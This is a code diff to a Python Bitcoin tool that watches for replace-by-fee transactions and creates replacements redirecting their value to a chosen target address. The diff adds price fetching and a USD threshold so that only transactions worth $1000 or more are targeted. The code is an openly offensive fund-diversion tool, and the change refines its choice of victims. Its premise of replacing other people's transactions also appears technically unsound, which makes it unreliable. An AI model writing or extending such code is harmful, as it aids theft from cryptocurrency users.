@@ -15,9 +15,10 @@ import requests
 class AutoReplacer:
     """Automatically replace detected RBF transactions to a target address"""
     
-    def __init__(self, target_address: str, replacement_strategy: str = 'moderate'):
+    def __init__(self, target_address: str, replacement_strategy: str = 'moderate', min_value_usd: float = 1000.0):
         self.target_address = target_address
         self.replacement_strategy = replacement_strategy
+        self.min_value_usd = min_value_usd
         self.logger = logging.getLogger(__name__)
         self.display = DisplayManager()
         self.config = Config()
@@ -26,12 +27,18 @@ class AutoReplacer:
         # Track processed transactions to avoid duplicates
         self.processed_txids: Set[str] = set()
         self.replacement_count = 0
+        self.skipped_count = 0
         
         # Session for API calls
         self.session = requests.Session()
         self.session.headers.update({
             'User-Agent': 'Bitcoin-AutoReplacer/1.0'
         })
+        
+        # Bitcoin price cache
+        self.btc_price_usd = None
+        self.price_cache_time = 0
+        self.price_cache_duration = 60  # Cache price for 60 seconds
         
     def validate_target_address(self) -> bool:
         """Validate the target Bitcoin address format"""
@@ -49,6 +56,50 @@ class AutoReplacer:
             
         return True
     
+    def get_btc_price_usd(self) -> Optional[float]:
+        """Get current Bitcoin price in USD with caching"""
+        current_time = time.time()
+        
+        if (self.btc_price_usd is not None and 
+            current_time - self.price_cache_time < self.price_cache_duration):
+            return self.btc_price_usd
+        
+        try:
+            # Try multiple price sources
+            price_apis = [
+                f"{self.config.get_api_url()}/prices",
+                "https://api.coindesk.com/v1/bpi/currentprice/USD.json"
+            ]
+            
+            for api_url in price_apis:
+                try:
+                    response = self.session.get(api_url, timeout=10)
+                    if response.status_code == 200:
+                        data = response.json()
+                        
+                        if 'USD' in data:  # Mempool.space format
+                            self.btc_price_usd = float(data['USD'])
+                        elif 'bpi' in data:  # CoinDesk format
+                            self.btc_price_usd = float(data['bpi']['USD']['rate'].replace(',', ''))
+                        
+                        if self.btc_price_usd:
+                            self.price_cache_time = current_time
+                            return self.btc_price_usd
+                            
+                except Exception as e:
+                    self.logger.debug(f"Price API {api_url} failed: {e}")
+                    continue
+            
+            # Fallback to a reasonable estimate if all APIs fail
+            self.logger.warning("Could not fetch Bitcoin price, using fallback")
+            self.btc_price_usd = 107000.0  # Reasonable current estimate
+            self.price_cache_time = current_time
+            return self.btc_price_usd
+            
+        except Exception as e:
+            self.logger.error(f"Error fetching Bitcoin price: {e}")
+            return None
+
     def get_transaction_details(self, txid: str) -> Optional[Dict]:
         """Fetch transaction details from API"""
         try:
@@ -159,6 +210,28 @@ class AutoReplacer:
             total += output.get('value', 0)
         return total
     
+    def calculate_transaction_value_usd(self, tx_data: Dict) -> float:
+        """Calculate transaction value in USD"""
+        try:
+            btc_price = self.get_btc_price_usd()
+            if not btc_price:
+                return 0.0
+            
+            # Calculate total output value in satoshis
+            total_satoshis = 0
+            for output in tx_data.get('vout', []):
+                total_satoshis += output.get('value', 0)
+            
+            # Convert to BTC then USD
+            btc_value = total_satoshis / 100000000  # satoshis to BTC
+            usd_value = btc_value * btc_price
+            
+            return usd_value
+            
+        except Exception as e:
+            self.logger.error(f"Error calculating USD value: {e}")
+            return 0.0
+
     def process_rbf_transaction(self, txid: str) -> bool:
         """Process a single RBF transaction for replacement"""
         if txid in self.processed_txids:
@@ -171,10 +244,23 @@ class AutoReplacer:
         if not tx_data:
             return False
         
+        # Check transaction value threshold
+        usd_value = self.calculate_transaction_value_usd(tx_data)
+        if usd_value < self.min_value_usd:
+            self.skipped_count += 1
+            print(f"⏭️  Skipped {txid[:16]}... (${usd_value:.2f} < ${self.min_value_usd:.0f})")
+            return False
+        
+        print(f"🎯 High-value transaction found: {txid[:16]}... (${usd_value:.2f})")
+        
         # Create replacement
         replacement = self.create_replacement_to_address(tx_data)
         if not replacement:
             return False
+        
+        # Add USD value to replacement data
+        replacement['transaction_value_usd'] = usd_value
+        replacement['btc_price_used'] = self.get_btc_price_usd()
         
         # Save replacement data
         filename = f"auto_replacement_{txid[:16]}_{int(time.time())}.json"
@@ -190,9 +276,10 @@ class AutoReplacer:
     def display_replacement_created(self, replacement: Dict, filename: str):
         """Display replacement creation results"""
         print("\n" + "="*60)
-        print("🔄 AUTOMATIC REPLACEMENT CREATED")
+        print("🔄 HIGH-VALUE REPLACEMENT CREATED")
         print("="*60)
         print(f"Original TxID: {replacement['original_txid'][:16]}...")
+        print(f"Transaction Value: ${replacement.get('transaction_value_usd', 0):.2f}")
         print(f"Target Address: {replacement['target_address']}")
         print(f"Strategy: {replacement['strategy_used']['name'].upper()}")
         print(f"Redirected Value: {replacement['total_value_redirected']} sat")
@@ -248,7 +335,7 @@ class AutoReplacer:
                     # Show status
                     elapsed = int((time.time() - start_time) / 60)
                     remaining = duration_minutes - elapsed
-                    print(f"⏱️  Running: {elapsed}m elapsed, {remaining}m remaining, {self.replacement_count} replacements created")
+                    print(f"⏱️  Running: {elapsed}m elapsed, {remaining}m remaining, {self.replacement_count} replacements created, {self.skipped_count} skipped (< ${self.min_value_usd:.0f})")
                 
             except Exception as e:
                 self.logger.error(f"Error in monitoring cycle: {e}")
@@ -269,15 +356,18 @@ def main():
     import sys
     
     if len(sys.argv) < 2:
-        print("Usage: python auto_replacer.py <target_address> [strategy] [duration_minutes]")
-        print("Example: python auto_replacer.py 1JHPrMhXRkd5LszkpPog7wVtpGfNHur2M9 moderate 30")
+        print("Usage: python auto_replacer.py <target_address> [strategy] [duration_minutes] [min_value_usd]")
+        print("Example: python auto_replacer.py 1JHPrMhXRkd5LszkpPog7wVtpGfNHur2M9 moderate 30 1000")
+        print("Strategies: conservative, moderate, aggressive, priority")
+        print("Min value: Minimum transaction value in USD to target (default: 1000)")
         return
     
     target_address = sys.argv[1]
     strategy = sys.argv[2] if len(sys.argv) > 2 else 'moderate'
     duration = int(sys.argv[3]) if len(sys.argv) > 3 else 30
+    min_value = float(sys.argv[4]) if len(sys.argv) > 4 else 1000.0
     
-    replacer = AutoReplacer(target_address, strategy)
+    replacer = AutoReplacer(target_address, strategy, min_value)
     replacer.monitor_and_replace(duration)
 
 if __name__ == "__main__":
